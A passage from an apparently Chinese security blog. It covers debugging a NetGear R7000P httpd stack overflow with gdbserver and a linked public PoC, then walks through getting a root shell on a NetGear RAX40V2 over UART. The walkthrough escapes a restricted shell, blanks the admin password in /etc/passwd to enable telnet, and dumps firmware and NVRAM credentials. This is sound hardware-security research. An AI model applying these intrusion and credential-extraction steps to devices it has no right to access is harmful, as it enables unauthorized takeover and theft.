alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image20"></p><h3 id="远程动态调试"><a href="#远程动态调试" class="headerlink" title="远程动态调试"></a>远程动态调试</h3><p>动态调试工具：编译好的 gdbserver (arm 架构)、gdb(arm 架构)<br>poc: 【<a href="https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2020.06.15-netgear/exploit.py%E3%80%91">https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2020.06.15-netgear/exploit.py】</a></p><p><strong>gdbserver 启动</strong><br>在使用串口接入设备之后，把gdbserver 上传到设备的&#x2F;tmp 目录中</p><pre><code class="hljs">cd /tmp/;wget http://xx.xx.xx.xx:xxxx/gdbserver;chmod 777 gdbserver</code></pre><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image21.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image21"><br>在设备中查找 “httpd” 的进程号<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image22.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image22"><br>将httpd 进行附加到 gdbserver</p><pre><code class="hljs">./gdbserver *:12345 --attach 3256</code></pre><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image23.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image23"></p><p><strong>gdb 远程连接gdbserver</strong></p><pre><code class="hljs">target remote 192.168.1.1:12345</code></pre><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image24.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image24"></p><p><strong>开始调试</strong><br>在关键的地点打好断点<br>打断点</p><pre><code class="hljs">(gdb) break *0x00017398Breakpoint 1 at 0x17398(gdb) break *0x0001CFF0Breakpoint 2 at 0x1cff0(gdb) break *0x0001D0C4Breakpoint 3 at 0x1d0c4</code></pre><p>然后输入”continue”， 接着执行exploit</p><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image25.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image25"><br>到$R0寄存器中作为vulfunc的参数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image26.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image26"><br>接下来我们看寄存器的值，可以看到$r0 寄存器的值为 0xbe940f89</p><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image27.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image27"></p><p>查看0xbe940f89 内存地址中的值，可以看到内存中成功的被覆盖了构造好的数据。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image28.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image28"></p><p>然后接着“continue” 往下执行，执行到 0x0001cff0 断点位置会执行 memcpy 函数。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image29.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image29"><br>查看执行到memcpy函数时，寄存器中的值，由于memcpy函数会调用 $r0 , $r1 , $r2 寄存器的值作为参数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image30.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image30"><br>查看$r0 , 和 r1 寄存器内的值， 在执行前r0 还没被$r1 中的值覆盖。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image31.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image31"><br>执行完memcpy 函数之后r0 被r1中的值所覆盖<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image32.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image32"><br>接着往下执行，vulfunc函数 会把栈上的地址复制到 r4~r11,pc 寄存器中<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image33.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image33"><br>接着往下执行到system 函数，可以看到 $r0 寄存器地址上的值是我们要执行的command。接着往下执行就会达到执行命令的效果<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image34.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image34"></p><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>虽然poc 中已经计算好了偏移，但是我们需要自己去计算。<br>如下图所示，我们可以知道memcpy 中 第一个参数s 的离栈底的偏移是 136<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image35.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image35"><br>最终构造的rop 链如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image36.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image36"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这个漏洞的调试，可以学些到通过UART在路由器中进行远程调试。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NetGear_夜鹰_RAX40V2_设备与固件分析</title>
    <link href="/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="NetGear-夜鹰-RAX40V2-设备与固件分析"><a href="#NetGear-夜鹰-RAX40V2-设备与固件分析" class="headerlink" title="NetGear 夜鹰 RAX40V2 设备与固件分析"></a>NetGear 夜鹰 RAX40V2 设备与固件分析</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>NetGear 厂商的路由器设备中，拆解开经常会带有UART 调试串口，并且以往的NetGear 设备UART调试口往往只需要正确的检测出UART引脚的类型，设置波特率为115200，然后直接用串口调试软件配合FT232就可以直接获取设备内部的shell。但是Nightawk 夜鹰 RAX40V2 路由器在接入UART调试串口时，却有所不同。本篇文章，将带来对NetGear RAX40v2 在路由器开发板上的UART 获取shell的过程中遇到的一些问题，如何进行解决，循序渐进的开启设备的telnet，让我们拭目以待。</p><h3 id="0x02-设备分析"><a href="#0x02-设备分析" class="headerlink" title="0x02 设备分析"></a>0x02 设备分析</h3><p>产品名称：Nighthawk AX4 4-Stream WiFi Router</p><p>固件版本：V1.0.2.82_2.0.50</p><p>发布日期：2020年 </p><p>首先我们从设备侧入手，拆解的过程以及设备硬件的配置，这不属于本片文章的重点，这里就不做过多的讲解。</p><h3 id="0x03-设备串口分析"><a href="#0x03-设备串口分析" class="headerlink" title="0x03 设备串口分析"></a>0x03 设备串口分析</h3><p>引脚分析，这款设备的引脚已经给了针脚，也免去了另外焊接针脚的工作，根据万用表和逻辑分析仪的识别（其实没用到逻辑分析仪）</p><p>从上到下依次是  VCC 引脚、GND引脚 (红线)、TXD引脚（黄线）、RXD引脚（橙线）</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210801191841695.png" alt="image-20210801191841695"></p><p><strong>波特率识别</strong></p><p>首先识别FTD 232 USB “ls -ll &#x2F;dev&#x2F;tty*” </p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723101732932.png" alt="image-20210723101732932"></p><p>接下来使用devttys0 的小工具baudrate.py 来识别波特率，只需要简单的使用上下键，就可以识别不同的波特率。如下图所示，设备识别为115200。 这也是NetGear 常用的波特率，其他的厂商的波特率也很多使用这个波特率。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715091851990.png" alt="image-20210715091851990"></p><p>tip： 这里顺带提一下，baudrate.py 识别的波特率是设置好的常见波特率，但是里面只设置了几个可以识别的波特率，如果需要增加识别广度，需要在脚本内部的BAUDRATES 参数中增加想要识别的波特率值。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210731160636040.png" alt="image-20210731160636040"></p><p><strong>获取启动log</strong></p><p>现在我们已经知道了波特率，接下来获取设备在启动的时候的log 信息，分析这些log 对设备分析有的时候会非常有用。但是常常 UART 的log 信息会非常多并且启动比较快。因此需要想办法将这些log 保存下来，以便后续分析。</p><p>我们使用minicom 打开，选择 “Serial port setup” –&gt; 设置 ”A—Serial Device“ 和 ”E “的波特率，minicom 使用的方法搜索一下有详细的使用说明。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723101955993.png" alt="image-20210723101955993"></p><p>保存串口log 为文件，关闭也是一样的。最终可以看到生成的文件，文本编辑器打开生成的文件。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723105834287.png" alt="image-20210723105834287"></p><p>tips: 非正常关闭minicom，会在&#x2F;var&#x2F;lock下创建几个文件LCK*，这几个文件阻止了minicom的运行，将它们删除后即可恢复。</p><p> 查看设备启动的log ，log 很多，这里截选了部分的log信息。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">squashfs: <span class="hljs-keyword">version</span> <span class="hljs-number">4.0</span> (<span class="hljs-number">2009</span>/<span class="hljs-number">01</span>/<span class="hljs-number">31</span>) Phillip Lougher<br>jffs2: <span class="hljs-keyword">version</span> <span class="hljs-number">2.2</span>. (NAND) (<span class="hljs-keyword">SUMMARY</span>)  © <span class="hljs-number">2001</span><span class="hljs-number">-2006</span> Red Hat, Inc.<br>fuse init (API <span class="hljs-keyword">version</span> <span class="hljs-number">7.23</span>)<br>SGI XFS <span class="hljs-keyword">with</span> <span class="hljs-keyword">security</span> attributes, <span class="hljs-keyword">no</span> <span class="hljs-keyword">debug</span> enabled<br>io scheduler noop registered (<span class="hljs-keyword">default</span>)<br>brd: module loaded<br><span class="hljs-keyword">loop</span>: module loaded<br>nand: device <span class="hljs-built_in">found</span>, Manufacturer ID: <span class="hljs-number">0xef</span>, Chip ID: <span class="hljs-number">0xda</span><br>nand: <span class="hljs-type">Unknown</span> W29N02GV<br>nand: <span class="hljs-number">256</span> MiB, SLC, erase size: <span class="hljs-number">128</span> KiB, page size: <span class="hljs-number">2048</span>, OOB size: <span class="hljs-number">64</span><br>bcm63xx_nand ff801800.nand: Adjust timing_1 <span class="hljs-keyword">to</span> <span class="hljs-number">0x6532845b</span> timing_2 <span class="hljs-keyword">to</span> <span class="hljs-number">0x00091e94</span><br>bcm63xx_nand ff801800.nand: detected <span class="hljs-number">256</span>MiB total, <span class="hljs-number">128</span>KiB blocks, <span class="hljs-number">2</span>KiB pages, <span class="hljs-number">16</span>B OOB, <span class="hljs-number">8</span>-<span class="hljs-type">bit</span>, BCH<span class="hljs-number">-4</span><br>Bad block <span class="hljs-keyword">table</span> <span class="hljs-built_in">found</span> at page <span class="hljs-number">131008</span>, <span class="hljs-keyword">version</span> <span class="hljs-number">0x01</span><br>Bad block <span class="hljs-keyword">table</span> <span class="hljs-built_in">found</span> at page <span class="hljs-number">130944</span>, <span class="hljs-keyword">version</span> <span class="hljs-number">0x01</span><br>&gt;&gt;&gt;&gt;&gt; <span class="hljs-keyword">For</span> <span class="hljs-keyword">primary</span> mtd <span class="hljs-keyword">partition</span> rootfs, cferam/vmlinux.lz UBI volume, vmlinux fs mounted <span class="hljs-keyword">as</span> squash fs <span class="hljs-keyword">on</span> UBI &lt;&lt;&lt;&lt;&lt;<br>Secondary mtd <span class="hljs-keyword">partition</span> rootfs_update detected <span class="hljs-keyword">as</span> UBI <span class="hljs-keyword">for</span> cferam/vmlinux source <span class="hljs-keyword">and</span> UBIFS <span class="hljs-keyword">for</span> vmlinux filesystem<br>Creating <span class="hljs-number">11</span> MTD partitions <span class="hljs-keyword">on</span> &quot;brcmnand.0&quot;:<br><span class="hljs-number">0x000000100000</span><span class="hljs-number">-0x000006900000</span> : &quot;rootfs&quot;<br><span class="hljs-number">0x000006900000</span><span class="hljs-number">-0x000006d00000</span> : &quot;rootfs_update&quot;<br><span class="hljs-number">0x000007f00000</span><span class="hljs-number">-0x00000ff00000</span> : &quot;data&quot;<br><span class="hljs-number">0x000000000000</span><span class="hljs-number">-0x000000100000</span> : &quot;nvram&quot;<br><span class="hljs-number">0x000000100000</span><span class="hljs-number">-0x000006900000</span> : &quot;image&quot;<br><span class="hljs-number">0x000006900000</span><span class="hljs-number">-0x000006d00000</span> : &quot;image_update&quot;<br><span class="hljs-number">0x000000000000</span><span class="hljs-number">-0x000010000000</span> : &quot;dummy1&quot;<br><span class="hljs-number">0x000000000000</span><span class="hljs-number">-0x000010000000</span> : &quot;dummy2&quot;<br><span class="hljs-number">0x000007a00000</span><span class="hljs-number">-0x000007f00000</span> : &quot;misc3&quot;<br><span class="hljs-number">0x000007500000</span><span class="hljs-number">-0x000007a00000</span> : &quot;misc2&quot;<br><span class="hljs-number">0x000006d00000</span><span class="hljs-number">-0x000007500000</span> : &quot;misc1&quot;<br>tun: Universal TUN/TAP device driver, <span class="hljs-number">1.6</span><br>tun: (C) <span class="hljs-number">1999</span><span class="hljs-number">-2004</span> Max Krasnyansky &lt;maxk@qualcomm.com&gt;<br>PPP generic driver <span class="hljs-keyword">version</span> <span class="hljs-number">2.4</span><span class="hljs-number">.2</span><br>PPP BSD Compression module registered<br>PPP Deflate Compression module registered<br>NET: Registered protocol <span class="hljs-keyword">family</span> <span class="hljs-number">24</span><br>i2c /dev entries driver<br>bcm96xxx-wdt ff800480.watchdog: Broadcom BCM96xxx watchdog timer<br>brcmboard registered<br>brcmboard: brcm_board_init entry<br>print_rst_status: Last <span class="hljs-keyword">RESET</span> due <span class="hljs-keyword">to</span> HW <span class="hljs-keyword">reset</span><br>print_rst_status: <span class="hljs-keyword">RESET</span> reason: <span class="hljs-number">0x00000000</span><br>DYING GASP IRQ Initialized <span class="hljs-keyword">and</span> Enabled<br>map_hw_timer_interrupt,<span class="hljs-number">130</span>: interrupt_id <span class="hljs-number">22</span><br>map_hw_timer_interrupt,<span class="hljs-number">130</span>: interrupt_id <span class="hljs-number">23</span><br>map_hw_timer_interrupt,<span class="hljs-number">130</span>: interrupt_id <span class="hljs-number">24</span><br>map_hw_timer_interrupt,<span class="hljs-number">130</span>: interrupt_id <span class="hljs-number">25</span><br>Allocated EXT_TIMER number <span class="hljs-number">3</span><br>Broadcom Timer Initialized <br></code></pre></td></tr></table></figure><p><strong>接入UART调试口shell</strong></p><p>UART 接入，设置好波特率，重启设备，待设备系统启动完成，启动日志输出完之后，连接shell ，但是需要登录口令。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712165152831.png" alt="image-20210712165152831"></p><p>遇到这种方法，本打算尝试调整uboot在引导linux kernel时使用的启动参数(bootargs) 直接访问跟文件系统。但是我很幸运的使用弱口令进去之后，但是发现这是一个低权限的shell，并且支持的可执行的命令非常有限。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210713111508346.png" alt="image-20210713111508346"></p><p>正当我一筹莫展的时候，想起了曾经看到的一款思科的设备的shell 也是类似这种低权限的shell，但是输入 “sh”、”\bin\sh” 、”bash” 等命令可以获取完整版的shell。很幸运，在我输入”sh” 之后，成功的获取了设备完整的shell，并且支持的可执行的命令也变多了。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163602257.png" alt="image-20210712163602257"></p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163621067.png" alt="image-20210712163621067"></p><p>busybox</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163718580.png" alt="image-20210712163718580"></p><h3 id="0x04-开启telnet"><a href="#0x04-开启telnet" class="headerlink" title="0x04 开启telnet"></a>0x04 开启telnet</h3><p>到这里我已经能通过UART串口获取设备的shell了，但是进入设备shell 过于复杂，并且我也不满足于UART的shell， 于是接着我尝试开启设备的ssh 、 telnet 的shell。我在测试的过程中，执行&#x2F;bin&#x2F;文件中的telnetd 毫无反应，并且执行busyBox 中的telnetd 也同样显示错误，我开始猜测开发者可能将telnetd做了更改，导致无法正常使用，但是我在 &#x2F;usr&#x2F;sbin&#x2F;文件目录中找到了 utelnetd 可执行文件，并且执行后很明显的开启了23端口进行监听连接。然而一切都不如我所愿，进行登录的时候又显示需要登录口令，我尝试使用UART的弱口令和一些常见的口令也无法进入shell。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715152841551.png" alt="image-20210715152841551"></p><p>并且我使用google 搜索 NetGear  有没有历史的telnet 口令，在一个论坛中看到了一些信息，但是也依旧没有任何效果。</p><p><a href="https://openwrt.org/toh/netgear/telnet.console">https://openwrt.org/toh/netgear/telnet.console</a></p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715164537309.png" alt="image-20210715164537309"></p><p>于是我打算通过UART提供的调试接口直接修改passwd 文件，因为是root 的权限，因此直接更改admin 用户的密码为空。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># cat /etc/passwd </span><br><span class="hljs-symbol">nobody:</span><span class="hljs-variable">$1</span><span class="hljs-variable">$hFVKPORB</span><span class="hljs-variable">$llSaVGwuSWo</span>.<span class="hljs-symbol">CTxU5.Qk30:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">admin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:admin</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-comment"># chmod 777 /etc/passwd </span><br><span class="hljs-comment"># vi /etc/passwd </span><br><span class="hljs-comment"># /usr/sbin/utelnetd </span><br><span class="hljs-symbol">telnetd:</span> starting<br>  <span class="hljs-symbol">port:</span> <span class="hljs-number">23</span>; <span class="hljs-symbol">interface:</span> any; login <span class="hljs-symbol">program:</span> /bin/login<br></code></pre></td></tr></table></figure><p>更改为如下图所示</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210722173201973.png" alt="image-20210722173201973"></p><p>然后重新启动utelnetd 服务，使用telnet 连接在输入用户名admin 之后就可以直接获取到shell 。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715164004220.png" alt="image-20210715164004220"></p><h3 id="0x05-固件提取"><a href="#0x05-固件提取" class="headerlink" title="0x05 固件提取"></a>0x05 固件提取</h3><p>由于这款设备的是NetGear 的产品，设备固件都是可以直接下载来的，对这部分不感兴趣的直接跳过。</p><p>接下来开始提取设备内部的文件系统，根据前面的查看设备启动时的系统信息，并且配合设备内部的mtd信息分别，确定设备的文件系统是mtd11</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712160130811.png" alt="image-20210712160130811"></p><p>使用dd 命令进行提取，在提取之前要确定空间使用的情况，以免文件太大，文件夹中放不下，如果文件太大，可以考虑将bin 文件进行压缩一下。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/mtd11 <span class="hljs-attribute">of</span>=/tmp/rootfs_ubifs.bin<br></code></pre></td></tr></table></figure><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723165441822.png" alt="image-20210723165441822"></p><p>由于设备内有 tftp ，尝试使用tftp 来进行提取dd 转储的bin 文件，但是遗憾的是，tftp 上传文件到本地tftpd server 的文件是设备内部的配置信息。其他的命令也无法正常将文件提取到设备外部。所幸文件系统内部有可以使用的wget 命令，直接上传上传一个对应架构的完整版busybox 到其中，使用完整版的tftp 将文件传出来即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tftp</span> -p -t -f rootfs_ubifs.bin <span class="hljs-number">172.15.0.2</span><br></code></pre></td></tr></table></figure><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210722173407911.png" alt="image-20210722173407911"></p><p>再接下来我们提取设备的非易失性存储器NVRAM（断电之后，所存储的数据不丢失的随机访问存储器）。先将nvram的信息保存，然后使用buybox 的ftp 上传到本地中。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># nvram show &gt; nvram.bin</span><br><span class="hljs-meta"># strings nvram.bin &gt; nvram.html</span><br></code></pre></td></tr></table></figure><p>成功提取，这里的 WiFi密码和web 管理界面的口令都没有加密，但是路由器忘记密码更改密码的答案给加密了。</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723093604176.png" alt="image-20210723093604176"></p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723091921560.png" alt="image-20210723091921560"></p><h3 id="0x06-固件解包"><a href="#0x06-固件解包" class="headerlink" title="0x06 固件解包"></a>0x06 固件解包</h3><p>上面讲述了如何提取设备的固件，但是NetGear 设备固件是开放了，直接去NetGear 官网下载即可。</p><p>下载完成之后，这是一个用 .chk 拓展名为结尾的NetGear 固件镜像，那么使用binwalk 查看一下固件包</p><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144246743.png" alt="image-20210715144246743"></p><p>使用binwalk -Me 解开固件包,解开固件包之后,可以看到有两个东西, 3A.ubi 文件和 ubifs-root 文件夹, 本以为固件中的文件系统提取到了ubifs-root 中，可以 ubifs-root 文件内没有任何东西。把关注点放在3A.ubi 文件上。</p><p><img 